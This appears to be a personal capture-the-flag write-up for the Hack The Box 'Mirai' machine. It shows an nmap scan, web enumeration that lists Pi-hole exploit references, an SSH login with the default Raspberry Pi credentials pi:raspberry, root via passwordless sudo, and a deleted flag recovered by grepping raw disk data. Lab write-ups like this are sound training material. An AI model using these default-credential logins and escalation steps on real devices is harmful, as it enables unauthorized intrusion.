# Mirai
### Ports scan
```text
# Nmap 7.92 scan initiated Sun Sep 18 15:13:16 2022 as: nmap -vv --reason -Pn -T4 --min-rate=1000 -sV -sC --version-all -A --osscan-guess -p- -oN /home/parallels/HacktheBox/OSCP-like/Linux-Mirai/results/10.10.10.48/scans/_full_tcp_nmap.txt -oX /home/parallels/HacktheBox/OSCP-like/Linux-Mirai/results/10.10.10.48/scans/xml/_full_tcp_nmap.xml 10.10.10.48
Nmap scan report for 10.10.10.48
Host is up, received user-set (0.027s latency).
Scanned at 2022-09-18 15:13:17 AEST for 27s
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJpzaaGcmwdVrkG//X5kr6m9em2hEu3SianCnerFwTGHgUHrRpR6iocVhd8gN21TPNTwFF47q8nUitupMBnvImwAs8NcjLVclPSdFJSWwTxbaBiXOqyjV5BcKty+s2N8I9neI2coRBtZDUwUiF/1gUAZIimeKOj2x39kcBpcpM6ZAAAAFQDwL9La/FPu1rEutE8yfdIgxTDDNQAAAIBJbfYW/IeOFHPiKBzHWiM8JTjhPCcvjIkNjKMMdS6uo00/JQH4VUUTscc/LTvYmQeLAyc7GYQ/AcLgoYFHm8hDgFVN2D4BQ7yGQT9dU4GAOp4/H1wHPKlAiBuDQMsyEk2s2J+60Rt+hUKCZfnxPOoD9l+VEWfZQYCTOBi3gOAotgAAAIBd6OWkakYL2e132lg6Z02202PIq9zvAx3tfViuU9CGStiIW4eH4qrhSMiUKrhbNeCzvdcw6pRWK41+vDiQrhV12/w6JSowf9KHxvoprAGiEg7GjyvidBr9Mzv1WajlU9BQO0Nc7poV2UzyMwLYLqzdjBJT28WUs3qYTxanaUrV9g==
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpSoRAKB+cPR8bChDdajCIpf4p1zHfZyu2xnIkqRAgm6Dws2zcy+VAZriPDRUrht10GfsBLZtp/1PZpkUd2b1PKvN2YIg4SDtpvTrdwAM2uCgUrZdKRoFa+nd8REgkTg8JRYkSGQ/RxBZzb06JZhRSvLABFve3rEPVdwTf4mzzNuryV4DNctrAojjP4Sq7Msc24poQRG9AkeyS1h4zrZMbB0DQaKoyY3pss5FWJ+qa83XNsqjnKlKhSbjH17pBFhlfo/6bGkIE68vS5CQi9Phygke6/a39EP2pJp6WzT5KI3Yosex3Br85kbh/J8CVf4EDIRs5qismW+AZLeJUJHrj
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCl89gWp+rA+2SLZzt3r7x+9sXFOCy9g3C9Yk1S21hT/VOmlqYys1fbAvqwoVvkpRvHRzbd5CxViOVih0TeW/bM=
|   256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILvYtCvO/UREAhODuSsm7liSb9SZ8gLoZtn7P46SIDZL
53/tcp    open  domain  syn-ack dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp    open  http    syn-ack lighttpd 1.4.35
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: lighttpd/1.4.35
1873/tcp  open  upnp    syn-ack Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp open  http    syn-ack Plex Media Server httpd
|_http-title: Unauthorized
|_http-favicon: Plex
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-cors: HEAD GET POST PUT DELETE OPTIONS
32469/tcp open  upnp    syn-ack Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 18 15:13:44 2022 -- 1 IP address (1 host up) scanned in 28.08 seconds

```

### Web Enum
```text
http://10.10.10.48/ -> blank

http://10.10.10.48/versions/ -> 1663478032,,,

http://10.10.10.48/admin/ -> admin panel (Pi-hole Version v3.1.4)
Possible exploits:
Pi-hole 4.3.2 - Remote Code Execution (Authenticated)   | python/webapps/48727.py
Pi-hole 4.4.0 - Remote Code Execution (Authenticated)   | linux/webapps/48519.py
Pi-hole < 4.4 - Authenticated Remote Code Execution     | linux/webapps/48442.py

http://10.10.10.48/admin/index.php?login -> login interface

http://10.10.10.48:32400/ -> Plex server
```

### Exploitation
```bash
# sign up plex server http://10.10.10.48:32400 (no luck)
acc: evil12138
email: evil12138@evil.com
pwd evilevil

# found pi-hole default cred
pi:raspberry

# login ssh with default cred
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" pi@$IP

```

### Priv Esc
```bash
# user can switch to sudo without password but the root flag was deleted
sudo su

# display disks info
lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   10G  0 disk 
├─sda1   8:1    0  1.3G  0 part /lib/live/mount/persistence/sda1
└─sda2   8:2    0  8.7G  0 part /lib/live/mount/persistence/sda2
sdb      8:16   0   10M  0 disk /media/usbstick
sr0     11:0    1 1024M  0 rom  
loop0    7:0    0  1.2G  1 loop /lib/live/mount/rootfs/filesystem.squashfs

# extract flag from memory
grep -aPo '[a-fA-F0-9]{32}' /dev/sdb

```
